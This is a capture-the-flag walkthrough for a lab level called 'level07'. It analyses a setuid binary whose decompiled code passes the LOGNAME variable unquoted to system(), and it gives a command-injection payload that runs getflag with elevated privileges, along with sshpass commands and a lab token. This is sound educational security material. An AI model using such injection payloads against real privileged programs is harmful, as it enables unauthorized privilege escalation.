# level07

## Steps

1. __Action__ (Guest): check the content of the `level07` user home directory once connected
	```sh
	ls -A
	```

2. __Observation__ (Guest): the previous command reveals 1 file possibly of interest,
	named `level07`
	```
	.bash_logout  .bashrc  .profile  level07
	```

3. __Action__ (Guest): check the permissions of the `level07` file
	```sh
	getfacl level07
	```

4. __Observation__ (Guest): the previous command reveals that the `level07` file:
	- is readable by the `level07` group
	- is executable by the `level07` group
	- has the `setuid` and the `setgid` bits enabled
	```
	# file: level07
	# owner: flag07
	# group: level07
	# flags: ss-
	user::rwx
	group::r-x
	other::r-x
	```

5. __Action__ (Guest): decompile the `level07` file using [dogbolt](https://dogbolt.org/)

6. __Observation__ (Host): the Ghidra decompiler reveals that the `level07` file calls
	the `system` function to invoke `echo` via an absolute path, so we may not hack it
	via a symbolic link as we did in the `level03`, but we also see that it manually
	expands the `LOGNAME` environment variable, and then it passes it to `echo`
	without single-quotes, so we can exploit the `LOGNAME` environment variable
	to inject arbitrary commands
	```c
	int main(void) {
		__gid_t egid;
		__uid_t euid;
		char *  command_line;
		char *  logname;
		int     exit_status;
	
		egid = getegid();
		euid = geteuid();
		setresgid(egid, egid, egid);
		setresuid(euid, euid, euid);
		logname = getenv("LOGNAME");
		asprintf(&command_line, "/bin/echo %s ", logname);
		exit_status = system(command_line);
		free(command_line);

		return exit_status;
	}
	```

7. __Action__ (Guest): execute the `level07` file with the `LOGNAME` environment variable set
	to a command injection payload to run the `getflag` command and save the token to a file
	```sh
	env -i LOGNAME='$( getflag )' ./level07 | grep -oE '[^ ]+$' >/tmp/token
	```

8. __Action__ (Guest): check that the `token` file has been correctly created
	and contains the wanted token
	```sh
	cat /tmp/token
	```

9. __Observation__ (Guest): the previous command reveals that the file has been created,
	and seems to contain the wanted token
	```
	fiumuikeil55xe9cu4dood66h
	```

10. __Action__ (Host): check if the token is correct by trying to connect as the `level08` user
	```sh
	sshpass -p fiumuikeil55xe9cu4dood66h 2>/dev/null \
		ssh -p 4242 level08@192.168.122.214 exit \
	&& echo 'Great! The token is correct!' \
	|| echo 'Nop, the token is incorrect!'
	```

11. __Observation__ (Host): the previous command reveals that the token is correct,
	by printing the following message on stdout:  
	`Great! The token is correct!`

12. __Action__ (Host): copy the `token` file from the virtual machine
	```sh
	sshpass -f level06/flag 2>/dev/null \
		scp -P 4242 level06@192.168.122.214:/tmp/token level07/flag
	```

13. __Action__ (Guest): remove the `token` file
	```sh
	rm /tmp/token
	```
